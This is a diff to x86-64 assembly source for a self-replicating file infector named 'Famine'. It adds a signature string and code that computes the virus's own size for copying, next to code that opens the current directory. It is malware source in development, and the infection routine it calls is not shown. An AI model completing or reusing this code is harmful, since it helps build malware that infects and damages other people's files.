@@ -12,6 +12,10 @@
 section .text
 	global _start
 	extern _treat_file
+	extern _final_end
+
+_string:
+	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
 _start:
 	push rbp
@@ -25,11 +29,14 @@ _start:
 	; rsp + 304: unused
 	; rsp + 312: unused
 
-_calculate_start_of_virus:
+_calculate_virus_size:
 	xor r10, r10 ; r10 = 0
-;	lea r10, [rel _size_end] ; r10 = &_size_end
-;	sub r10, [rel _start] ; r10 -= &start
-;	mov QWORD [rsp + 280], r10 ; virus size = r10
+	lea r10, [rel _final_end] ; r10 = &_final_end
+	add r10, 2 ; final_end have 2 bytes of instrucitions
+	xor r11, r11
+	lea r11, [rel _string] ; r11 = &_string
+	sub r10, r11 ; &_final_end -= &_string
+	mov QWORD [rsp + 280], r10 ; virus size = r10
 
 _open_dir:
 	push 0x00002f2e ; push "./"
@@ -101,5 +108,3 @@ _end:
 	syscall
 	leave
 	ret
-
-_size_end:
